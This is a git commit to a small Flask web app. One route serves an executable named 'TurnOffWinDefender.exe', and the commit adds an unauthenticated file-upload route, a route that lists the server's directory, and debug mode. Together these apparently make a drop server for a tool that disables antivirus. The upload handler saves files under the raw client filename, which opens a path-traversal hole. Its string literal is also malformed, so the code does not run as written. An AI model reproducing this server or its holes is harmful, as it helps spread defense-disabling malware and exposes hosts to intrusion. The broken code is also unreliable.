0719f98a0cd7ec2f9ab06eba39fd3ab66fec05db
thinhabc01 <62796914+thinhabc01@users.noreply.github.com>
2022-07-02 23:41:29 +0700

    Update app.py

--- app.py
+++ app.py
@@ -12,13 +12,38 @@ def homepage():
 
     <img src="http://loremflickr.com/600/400" />
     """.format(time=the_time)
-
+#===========================download file================================
 @app.route('/return-files/')
 def return_files_tut():
 	try:
 		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
 	except Exception as e:
 		return str(e)
+	
+
+	
+#========================upload file=====================================
+@app.route('/upload')  
+def upload():  
+    return render_template("file_upload_form.html")  
+ 
+@app.route('/success', methods = ['POST'])  
+def success():  
+    if request.method == 'POST':  
+        f = request.files['file']  
+        f.save("upload\"+f.filename)  
+        return render_template("success.html", name = f.filename)  
+
+
+
+@app.route('/getinfo')
+def getinfo():
+    s = ""
+    arr = os.listdir(os.path.normpath(os.getcwd()))
+    for i in arr :
+        s += str(i) + "\n"
+    return s
+
 
 if __name__ == '__main__':
     app.run(debug=True, use_reloader=True)
